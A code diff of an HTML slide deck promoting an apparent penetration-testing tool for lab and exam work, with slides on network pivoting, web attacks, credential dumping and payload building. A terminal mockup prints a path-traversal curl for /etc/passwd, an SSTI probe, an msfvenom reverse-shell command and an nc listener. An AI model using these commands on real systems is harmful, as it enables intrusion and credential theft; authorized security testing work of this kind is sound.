-            <div class="lg-bh"><b>Tunnel &amp; routes</b><span class="lg-loc console">ligolo console</span><span class="lg-copy">Copy</span></div>
-            <code>interface_create --name ligolo<br>interface_add_route --route 172.16.1.0/24<br>tunnel_start</code></div></li>
-          <li><span class="lg-num">4</span><div class="lg-body">
-            <div class="lg-bh"><b>Scan it in Nabu</b><span class="lg-loc nabu">recon</span><span class="lg-copy">Copy</span></div>
-            <code>Scan → "Scan a host / range" → 172.16.1.0/24</code></div></li>
-        </ol>
-        <div class="lg-result">→ hosts stream into the recon tree &amp; graph <span>— grouped by subnet, pivoted via this host</span></div>
-      </div>
-    </div>`},
-
-  // 12 — DANTE pivots
-  {cls:"", html:`
-    <div class="eyebrow">Present · multi-network pivots</div>
-    <h2>One project — the entire internal engagement.</h2>
-    <div class="showcase hero">
-      ${S("dante-graph.png","Multi-network pivot spider-web from the Dante Pro Lab")}<div class="cap">Pivot topology · ENTRY branches to two /24s, then double + triple pivots reach two more — ports &amp; services on each host</div></div>
-      <div class="prow">
-        <div class="p"><span class="h">You tunnel, Nabu ingests.</span><small>ligolo-ng gives you the route; scans of each internal /24 stream in as they run.</small></div>
-        <div class="p"><span class="h">Chained pivots.</span><small>A host in one /24 reaches the next — 4 subnets, 40 hosts, DCs &amp; services here.</small></div>
-        <div class="p"><span class="h">Live-validated on Dante.</span><small>Every host tagged with the pivot it was reached through.</small></div>
-      </div>
-    </div>`},
-
-  // 12 — report
-  {cls:"", html:`
-    <div class="eyebrow">Present · the report</div>
-    <h2>Obsidian-ready, nothing hidden.</h2>
-    <div class="body even">
-      ${S("report.png","The generated markdown report")}<div class="cap">report.md · frontmatter, per-service findings, pivot topology, the full command log</div></div>
-      <ul class="points">
-        <li><span class="h">Drops into your vault.</span> <small>YAML frontmatter, headings, wikilinks, callouts — pure Obsidian markdown.</small></li>
-        <li><span class="h">Every command, logged.</span> <small>Full args, timing, exit code — plus an audit-trail appendix.</small></li>
-        <li><span class="h">The pivot section too.</span> <small>Each subnet → host → service, with the pivot source.</small></li>
-        <li><span class="h">Your write-up is half done.</span> <small>Export the whole project to a vault folder on demand.</small></li>
-      </ul>
-    </div>`},
-
-  // 13 — EXPLOITATION tab
-  {cls:"", html:`
-    <div class="eyebrow">New <span class="new">since Jul 15</span> · the Exploitation tab</div>
-    <h2>Now: work the surface — you attack.</h2>
-    <div class="body">
-      ${S("exploit-panel.png","The Exploitation tab, port-80 web attacks")}<div class="cap">Exploitation tab · a web box · LFI/SSTI/RCE/upload → a filled command ready to Run ▸</div></div>
-      <ul class="points">
-        <li><span class="h">Your services first.</span> <small>Marked ● and sorted to the top — this is the port-80 web playbook.</small></li>
-        <li><span class="h">Pre-filled for you.</span> <small>Target, port, a vault credential — dropped straight into each command.</small></li>
-        <li><span class="h">One click to a command.</span> <small>Copy it, or press <b>Run ▸</b>. Attacker-side runs; victim-side is copy-only.</small></li>
-        <li><span class="h">Organized like recon.</span> <small>Category tree: LFI, SSTI, command injection, upload→shell, deserialization, reverse shells.</small></li>
-      </ul>
-    </div>`},
-
-  // 14 — breadth (AD shot)
-  {cls:"", html:`
-    <div class="eyebrow">New <span class="new">since Jul 15</span> · breadth</div>
-    <h2>182 services. 3,411 ready-to-run actions.</h2>
-    <div class="body">
-      ${S("exploit-panel-ad.png","The Exploitation tab against Active Directory")}<div class="cap">Same tab, an AD box · secretsdump filled from a vault cred — impacket, evil-winrm, PtH</div></div>
-      <div>
-        <p class="lede" style="font-size:15px;margin-bottom:12px">Mined from your vault by a gap-analysis workflow across 13 reviewed batches — every service you meet:</p>
-        <div class="chips">
-          <span class="chip hot">ad · smb · winrm</span><span class="chip">mssql · mysql · oracle</span>
-          <span class="chip hot">web · wordpress · drupal</span><span class="chip">tomcat · jenkins · gitlab</span>
-          <span class="chip">redis · mongodb · elastic</span><span class="chip hot">exchange · sharepoint</span>
-          <span class="chip">pfsense · esxi · docker</span><span class="chip">smtp · clamav · exim</span>
-          <span class="chip hot">log4shell · text4shell</span><span class="chip">proftpd · shellshock …</span>
-        </div>
-      </div>
-    </div>`},
-
-  // 15 — parse loot -> vault
-  {cls:"", html:`
-    <div class="eyebrow">New <span class="new">since Jul 15</span> · loot</div>
-    <h2>Run → Parse → loot → back to the vault.</h2>
-    <div class="body">
-      ${S("exploit-loot.png","The Exploitation tab loot table after parsing secretsdump")}<div class="cap">Paste or stream output → Parse → dumped secrets (shown in full — your own capture) → Add to vault</div></div>
-      <ul class="points">
-        <li><span class="h">It reads the output for you.</span> <small>secretsdump / kerberoast / cleartext — hashes &amp; creds parsed into a loot table.</small></li>
-        <li><span class="h">Shown in full.</span> <small>This is your own dumped loot — not redacted here, so you can use it.</small></li>
-        <li><span class="h">One click to the vault.</span> <small>Add-to-vault writes them into <span class="kbd">creds.json</span> for the next service.</small></li>
-        <li><span class="h">Audited raw.</span> <small>Exploit commands are logged in full; recon-side redaction is unchanged.</small></li>
-      </ul>
-    </div>`},
-
-  // 16 — guardrail
-  {cls:"", html:`
-    <div class="eyebrow">New <span class="new">since Jul 15</span> · the guardrail</div>
-    <h2>Nothing auto-runs. You confirm every attack.</h2>
-    <div class="body even">
-      ${S("run-confirm.png","The Run-this-attack confirmation dialog")}<div class="cap">Press Run ▸ and Nabu confirms the target + the exact command before anything executes</div></div>
-      <div>
-        <div class="note warn" style="margin-bottom:14px"><span class="t">The human is the guardrail</span>
-          One command per Run, no chains, no autopwn. Recon mode is untouched and still passes the exam allow-list.</div>
-        <div class="legal">
-          <div class="box yes"><h4>✓ Shipped (OSCP+ allows)</h4>
-            <ul><li><b>Manual scripts</b>: impacket, evil-winrm, netexec</li><li><b>msfvenom</b> + multi/handler · public PoCs</li></ul></div>
-          <div class="box no"><h4>✗ Never shipped</h4>
-            <ul><li><b>Autopwn</b>: SQLmap, Metasploit modules</li><li>Mass scanners · AI at runtime</li></ul></div>
-        </div>
-      </div>
-    </div>`},
-
-  // 17 — msfvenom
-  {cls:"", html:`
-    <div class="eyebrow">New <span class="new">since Jul 15</span> · payloads</div>
-    <h2>Never fight the reverse-shell syntax again.</h2>
-    <div class="body even">
-      ${S("msfvenom-builder.png","The msfvenom payload builder dialog")}<div class="cap">🎯 Payload builder · the msfvenom command AND its matching listener, live</div></div>
-      <ul class="points">
-        <li><span class="h">Pick, don't memorize.</span> <small>Platform → payload → format; LHOST auto-fills from tun0.</small></li>
-        <li><span class="h">Command + listener together.</span> <small><span class="kbd">nc -lvnp</span> for stageless, <span class="kbd">multi/handler</span> for staged.</small></li>
-        <li><span class="h">Exam-safe by default.</span> <small>Non-meterpreter <span class="kbd">*_reverse_tcp</span>; meterpreter is flagged one-use.</small></li>
-        <li><span class="h">Copy-only.</span> <small>It builds the syntax; you run it. Bad chars are shell-quoted so <span class="kbd">\\x00</span> survives.</small></li>
-      </ul>
-    </div>`},
-
-  // 18 — headless CLI
-  {cls:"", html:`
-    <div class="eyebrow">Scriptable · headless</div>
-    <h2>The whole engine, from the terminal.</h2>
-    <div class="body">
-      <div class="term">
-        <span class="c"># the exact attack syntax, filled — display only</span><br>
-        <span class="pr">$</span> nabu-cli exploit web<br>
-        <span class="m">[RUN ]</span> LFI → /etc/passwd  ·  <span class="m">[RUN ]</span> SSTI {{7*7}} → RCE<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;curl -sk "http://target/../../../../etc/passwd"<br><br>
-        <span class="c"># build a payload + its listener</span><br>
-        <span class="pr">$</span> nabu-cli payload win-x64-stageless <span class="g">-l 10.10.14.7 -P 443</span><br>
-        <span class="m"># generate (on Kali):</span><br>
-        msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.7 LPORT=443 -f exe -o shell.exe<br>
-        <span class="m"># catch the shell:</span> &nbsp;nc -lvnp 443
-      </div>
-      <ul class="points">
-        <li><span class="h">Same engine, no GUI.</span> <small><span class="kbd">nabu-cli scan</span>, <span class="kbd">exploit</span>, <span class="kbd">payload</span>, <span class="kbd">doctor</span> — for scripting &amp; tests.</small></li>
-        <li><span class="h">Display-only exploit view.</span> <small>Shows RUN vs COPY per action; you still run it yourself.</small></li>
-        <li><span class="h">Host check built in.</span> <small><span class="kbd">nabu-cli doctor</span> reports any missing wrapped tool + its install command.</small></li>
-        <li><span class="h">Clean output.</span> <small>The owl banner is TTY-only, so pipes and tests stay tidy.</small></li>
-      </ul>
-    </div>`},
-
-  // 19 — quality
-  {cls:"", html:`
-    <div class="eyebrow">Built carefully</div>
-    <h2>182 services — and every one verified.</h2>
-    <div class="body even">
-      ${S("activity.png","The activity / audit log")}<div class="cap">Activity · an append-only audit trail — every action, timestamped</div></div>
-      <div>
-        <p class="lede" style="font-size:15px">Each batch was mined, machine-classified (attacker vs copy-only), then put through an adversarial multi-agent review and a whole-catalog safety sweep before it shipped.</p>
-        <div class="stats" style="grid-template-columns:repeat(2,1fr);max-width:none">
-          <div class="stat"><div class="n">0</div><div class="l">exam-restricted tools shipped as actions</div></div>
-          <div class="stat"><div class="n">0</div><div class="l">mis-classified "attacker" actions</div></div>
-          <div class="stat"><div class="n">3</div><div class="l">surfaces tested end-to-end (engine · GUI · CLI)</div></div>
-          <div class="stat"><div class="n">1,521</div><div class="l">automated tests, all green</div></div>
-        </div>
-      </div>
-    </div>`},
-
-  // 20 — closer
-  {cls:"center", html:`
-    <div class="eyebrow">For the team</div>
-    <h1>Scan a box. Switch tabs. <span class="gold">Go.</span></h1>
-    <p class="lede">Recon runs as you already know it. When you're ready, the <b>Exploitation</b> tab has your
-      open services at the top and the commands already filled in — pick one, read it, press Run, catch
-      your shell. The payload builder is one button away.</p>
-    <div class="note" style="margin:0 auto"><span class="t">Two ways in</span>
-      GUI: the <b>Exploitation</b> tab &amp; the <b>🎯 Payload builder…</b> button ·
-      Headless: <span class="kbd">nabu-cli exploit &lt;service&gt;</span> · <span class="kbd">nabu-cli payload</span></div>
-    <p class="lede" style="font-size:14px;margin-top:20px">Recon-first &amp; exam-legal by default · offline · no AI · you confirm every attack.</p>`},
-];
-
-const stage = document.getElementById("stage");
-SLIDES.forEach((s,i)=>{
-  const d=document.createElement("section");
-  d.className="slide "+(s.cls||"");
-  d.innerHTML=s.html+'<div class="hintbar">'+(i+1)+' / '+SLIDES.length+'</div>';
-  stage.appendChild(d);
-});
-const slides=[...document.querySelectorAll(".slide")];
-document.getElementById("tot").textContent=SLIDES.length;
-let idx=0, timer=null;
-const navPrev=document.getElementById("navPrev"), navNext=document.getElementById("navNext");
-function show(n){
-  idx=Math.max(0,Math.min(SLIDES.length-1,n));
-  slides.forEach((s,i)=>s.classList.toggle("active",i===idx));
-  document.getElementById("cur").textContent=idx+1;
-  document.getElementById("bar").style.width=((idx+1)/SLIDES.length*100)+"%";
-  navPrev.disabled=idx===0; navNext.disabled=idx===SLIDES.length-1;
-}
-function nextSlide(){ if(idx<SLIDES.length-1) show(idx+1); else if(timer) stopAuto(); }
-navNext.onclick=()=>show(idx+1); navPrev.onclick=()=>show(idx-1);
-document.addEventListener("keydown",e=>{
-  if(e.key==="ArrowRight"||e.key===" "||e.key==="PageDown"){e.preventDefault();show(idx+1);}
-  else if(e.key==="ArrowLeft"||e.key==="PageUp"){e.preventDefault();show(idx-1);}
-  else if(e.key==="Home")show(0); else if(e.key==="End")show(SLIDES.length-1);
-  else if(e.key.toLowerCase()==="f"){ if(!document.fullscreenElement)document.documentElement.requestFullscreen(); else document.exitFullscreen(); }
-});
-function startAuto(){ timer=setInterval(nextSlide,7000); document.getElementById("autoplay").textContent="⏸ Pause"; }
-function stopAuto(){ clearInterval(timer); timer=null; document.getElementById("autoplay").textContent="▶ Autoplay"; }
-document.getElementById("autoplay").onclick=()=>timer?stopAuto():startAuto();
-const root=document.documentElement; root.dataset.theme="dark";
-document.getElementById("theme").onclick=()=>{ root.dataset.theme=root.dataset.theme==="dark"?"light":"dark"; };
-show(0);
+document.getElementById('lk-map2').addEventListener('click',e=>{e.preventDefault();window.open(URLS.map,'_blank');});
+document.getElementById('theme').addEventListener('click',()=>{const c=document.documentElement.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');document.documentElement.setAttribute('data-theme',c==='dark'?'light':'dark');});
+function esc(s){return String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));}
 </script>
 </body>
 </html>
